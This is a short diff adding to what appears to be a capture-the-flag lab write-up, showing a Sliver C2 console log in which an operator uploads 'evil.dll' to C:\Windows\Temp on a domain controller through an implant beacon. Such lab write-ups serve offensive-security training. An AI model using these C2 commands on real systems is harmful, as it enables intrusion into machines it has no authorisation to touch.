@@ -408,3 +408,15 @@ PS C:\Windows\system32>
 
 ```
 
+```
+sliver (BLUSHING_ERROR) > upload /home/joel/hacking/ctf/htb/pro-lab/puppet/scripts/evil.dll C:\\Windows\\Temp\\evil.dll
+
+[*] Tasked beacon BLUSHING_ERROR (18cc32b5)
+
+[+] BLUSHING_ERROR completed task 18cc32b5
+
+[*] Wrote file to C:\Windows\Temp\evil.dll
+
+[*] Beacon dd83afe7 BLUSHING_ERROR - 172.16.40.5:58287 (DC01) - windows/amd64 - Mon, 13 Jul 2026 20:18:03 CEST
+
+```
